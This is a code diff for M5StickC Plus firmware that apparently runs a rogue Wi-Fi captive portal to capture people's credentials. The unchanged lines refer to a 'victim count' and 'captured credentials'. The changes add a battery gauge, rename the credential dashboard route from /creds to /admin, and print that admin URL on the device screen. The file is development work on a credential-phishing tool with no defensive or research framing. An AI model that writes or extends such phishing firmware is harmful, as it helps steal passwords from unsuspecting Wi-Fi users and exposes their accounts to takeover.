@@ -39,6 +39,7 @@ const unsigned long BLINK_INTERVAL = 150;  // ms between toggles
 #define C_MUTED   RGB565(138, 147, 166)  // labels
 #define C_CARD    RGB565(26, 29, 36)     // counter card
 #define C_COUNT   RGB565(255, 196, 0)    // victim count (amber)
+#define C_DANGER  RGB565(229, 72, 77)    // low-battery fill (red)
 bool dotOn = false;
  
 // Init System Settings
@@ -149,7 +150,7 @@ String creds() {
     "<div class=\"tile\"><div class=\"k\">Uptime</div><div class=\"v\">" + fmtUptime(millis()) + "</div></div>"
     "</div>"
     "<div class=\"bar\">"
-    "<a class=\"btn primary\" href=\"/creds\">&#8635; Refresh</a>"
+    "<a class=\"btn primary\" href=\"/admin\">&#8635; Refresh</a>"
     "<a class=\"btn danger\" href=\"/clear\" onclick=\"return confirm('Clear all captured credentials? This cannot be undone.')\">Clear all</a>"
     "<a class=\"btn\" href=\"/\">Back to portal</a>"
     "</div>"
@@ -260,7 +261,7 @@ String posted() {
 String clear() {
   Credentials = "";
   storedCount = 0;
-  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to dashboard</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/admin>Back to dashboard</a></center>" + footer();
 }
  
 // Arm a non-blocking blink: 5 on/off cycles = 10 toggles.
@@ -286,6 +287,40 @@ void updateBlink() {
 // Small "AP active" dot in the top-right of the header bar.
 void drawStatusDot(bool on) {
   M5.Lcd.fillCircle(228, 13, 5, on ? C_OK : C_OKDIM);
+}
+
+// Estimate battery charge (0-100%) from the AXP192 pack voltage.
+// Li-ion maps ~3.0V (empty) to ~4.07V (full) on the M5StickC Plus.
+int getBatteryPct() {
+  float v = M5.Axp.GetBatVoltage();
+  int pct = (int)(((v - 3.0) / (4.07 - 3.0)) * 100.0 + 0.5);
+  if (pct > 100) pct = 100;
+  if (pct < 0) pct = 0;
+  return pct;
+}
+
+// Battery gauge: a cell-shaped icon (body + nub) whose fill tracks the
+// charge level, with the percentage printed to its left. Drawn in the SSID
+// row, top-right. Repainted on the idle tick so the reading stays current.
+void drawBattery() {
+  int pct = getBatteryPct();
+  const int bx = 208, by = 38, bw = 26, bh = 13;
+  uint16_t col = (pct > 50) ? C_OK : (pct > 20 ? C_COUNT : C_DANGER);
+
+  // Clear the gauge area (percentage width changes with the digit count).
+  M5.Lcd.fillRect(156, by - 2, 84, bh + 5, C_BG);
+
+  // Cell body, terminal nub, and proportional fill.
+  M5.Lcd.drawRoundRect(bx, by, bw, bh, 2, C_MUTED);
+  M5.Lcd.fillRect(bx + bw, by + 4, 3, bh - 8, C_MUTED);
+  int fw = (bw - 4) * pct / 100;
+  M5.Lcd.fillRect(bx + 2, by + 2, fw, bh - 4, col);
+
+  // Percentage to the left of the icon.
+  M5.Lcd.setTextDatum(MR_DATUM);
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.drawString(String(pct) + "%", bx - 5, by + bh / 2);
 }
 
 // Animated boot splash: wordmark + a progress bar that fills once.
@@ -334,13 +369,17 @@ void drawMainScreen() {
   M5.Lcd.setTextColor(TFT_WHITE, C_BG);
   M5.Lcd.drawString(SSID_NAME, 8, 42);
 
-  // Gateway
+  // Battery gauge (top-right of the SSID row)
+  drawBattery();
+
+  // Admin panel link
+  M5.Lcd.setTextDatum(TL_DATUM);
   M5.Lcd.setTextSize(1);
   M5.Lcd.setTextColor(C_MUTED, C_BG);
-  M5.Lcd.drawString("GATEWAY", 8, 62);
-  M5.Lcd.setTextSize(2);
+  M5.Lcd.drawString("ADMIN PANEL - OPEN ON PHONE:", 8, 63);
+  M5.Lcd.setTextSize(1);
   M5.Lcd.setTextColor(C_ACCENT2, C_BG);
-  M5.Lcd.drawString(APIP.toString(), 8, 72);
+  M5.Lcd.drawString("http://" + APIP.toString() + "/admin", 8, 77);
 
   // Victim-count card
   M5.Lcd.fillRoundRect(3, 92, 234, 40, 8, C_CARD);
@@ -375,7 +414,7 @@ void setup() {
     startBlink();  // non-blocking; loop() redraws the stats screen with the new count
   });
  
-  webServer.on("/creds", []() {
+  webServer.on("/admin", []() {
     webServer.send(HTTP_CODE, "text/html", creds());
   });
   webServer.on("/clear", []() {
@@ -403,6 +442,7 @@ void loop() {
     } else {
       dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
       drawStatusDot(dotOn);
+      drawBattery();      // keep the battery reading current
     }
   }
   updateBlink();
